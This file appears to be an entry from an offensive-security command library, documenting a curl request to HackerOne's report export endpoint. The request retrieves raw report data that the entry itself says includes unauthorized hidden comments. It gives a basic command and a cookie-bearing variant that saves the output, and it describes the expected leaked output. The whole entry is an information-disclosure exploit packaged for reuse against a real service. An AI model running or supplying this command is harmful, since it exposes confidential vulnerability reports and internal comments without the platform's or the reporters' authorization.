---
data: >-
  curl
  "https://hackerone.com/reports/█████████/export/raw?include_internal_activities=false"
tags:
  - web
  - information-disclosure
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c4dafc36-1d65-495f-8258-87c4869c3a29
created_at: '2025-12-11T03:47:39.499Z'
updated_at: '2025-12-11T03:47:39.499Z'
verified: false
validated: true
submitted: true
---
# curl-hackerone-export

## Command

```bash
curl "https://hackerone.com/reports/█████████/export/raw?include_internal_activities=false"
```

## Description

This command uses curl to directly access the HackerOne report export endpoint, retrieving raw data that may include hidden comments in partially disclosed reports.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The export endpoint URL with report ID | Yes |
| include_internal_activities | Flag to exclude internal activities (set to false) | Yes |

## Examples

### Basic Usage

```bash
curl "https://hackerone.com/reports/█████████/export/raw?include_internal_activities=false"
```

### Advanced Usage

```bash
curl -H "Cookie: your_session_cookie" "https://hackerone.com/reports/█████████/export/raw?include_internal_activities=false" -o export.txt
```

## Expected Output

Raw text or JSON response containing report data, including unauthorized hidden comments.

## Related

- [[procedures/Direct-Access-to-Export-Endpoint]]
